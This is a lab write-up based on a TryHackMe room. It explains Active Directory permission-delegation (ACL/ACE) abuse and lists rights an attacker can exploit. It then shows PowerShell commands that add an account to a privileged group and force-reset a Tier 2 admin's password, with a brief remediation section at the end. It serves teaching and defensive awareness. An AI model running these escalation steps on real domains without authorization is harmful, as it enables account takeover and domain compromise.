### 1. What is Permission delegation?
In Active Directory, users can delegate permission to others to perform action. Imagine an organization with 100000 employees asking to reset their passwords, and this would be a headache to the system admin. Instead, he could assign the task to the Helpdesk team to do it, which could reduce a lot of work. However, in order to control security with permission delegation is also a big challenge for the IT team, and misconfigured delagation could lead to a lot of attacks, as we will discuss here.

### 2. Access Control Entries
Attacks using an ACL are also referred to as permission delegation exploits. The term "ACL-based attacks" refers to the ability of AD administrators to configure Access Control Entries (ACEs), which are used to fill Discretionary Access Control Lists (DACLs). With ACEs, almost any AD item may be secured. These ACEs then specify the permissions that every other AD object has against the target object, both allowed and forbidden. If these ACEs are configured incorrectly, an attacker might be able to take advantage of them. Imagine the HelpDesk team has ForceChangePassword delegation that they could use to reset password of the Domain Users group, this could be insecure because if the attackers can compromise one of the users in the Helpdesk group, he could use it to change the Domain Admins accounts and take over the domain.

There are a lot of misconfigured ACEs that we can use to exploit the system, some of the following are:
- ForceChangePassword: We can change users password without knowing their actual password.
- AddMembers: We add users or computers to groups.
- GenericAll: We have control with the object. We can change password, SPN, or add the users to group.
- GenericWrite: We can update any non-protected parameters of the target object. This could help us to add the users to groups.
- WriteOwner: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
- WriteDACL: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
- AllExtendedRights: We can perform any action with extended AD rights to the object, including changing users' passwords.

### 3. Example: Abusing GenericWrite permission delegation
Note: This lab scenario is hosted on Tryhackme which can be found here https://tryhackme.com/room/exploitingad

We can use Bloodhound to enumerate permissions of every object in the domain. Imagine a situation where we have GenericWrite permission over the IT support group, and the IT support has the ForceChangePassword permission that can change password of the Tier 2 Admins users, as shown in the image below.

![image](https://user-images.githubusercontent.com/112114250/230742373-aa45e6b9-7c6e-4e9d-9670-db523920e349.png)

From this, we can first add our users to the IT support group by running

```powershell
PS C:\>Add-ADGroupMember "IT Support" -Members "AD Account"
```

We can verify the user add completion using Get-ADGroupMember

```powershell
PS C:\>Get-ADGroupMember -Identity "IT Support"
distinguishedName : CN=hugh.jones,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc
name              : hugh.jones
objectClass       : user
objectGUID        : 460178d3-c818-4e28-9a39-b1ab2b0d3779
SamAccountName    : hugh.jones
SID               : S-1-5-21-3885271727-2693558621-2658995185-1113
```
After the user gets added successfully, we need to enumerate who is in the Tier 2 Admins group in order to change their passwords.

```powershell
PS C:\>Get-ADGroupMember -Identity "Tier 2 Admins"
distinguishedName : CN=t2_lawrence.lewis,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_lawrence.lewis
objectClass       : user
objectGUID        : 4ca61b47-93c8-44d2-987d-eca30c69d828
SamAccountName    : t2_lawrence.lewis
SID               : S-1-5-21-3885271727-2693558621-2658995185-1893

[....]

distinguishedName : CN=t2_leon.francis,OU=T2 Admins,OU=Admins,DC=za,DC=tryhackme,DC=loc
name              : t2_leon.francis
objectClass       : user
objectGUID        : 854b6d40-d537-4986-b586-c40950e0d5f9
SamAccountName    : t2_leon.francis
SID               : S-1-5-21-3885271727-2693558621-2658995185-3660
```

Remember one of the members, we can run Set-ADAccountPassword to force changing that user password

```powershell
PS C:\>$Password = ConvertTo-SecureString "New Password" -AsPlainText -Force 
PS C:\>Set-ADAccountPassword -Identity "AD Target Account" -Reset -NewPassword $Password 
```
After this, we have compromised the Tier 2 Admins group to go deeper into the environment!

### 4. Remediation

- Use least privilege to limit most bad scenarios that hackers can exploit
- Monitor high privilege accounts to alert as soon as possible

### 5. References
- ACLs theory: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
- Tryhackme lab: https://tryhackme.com/room/exploitingad
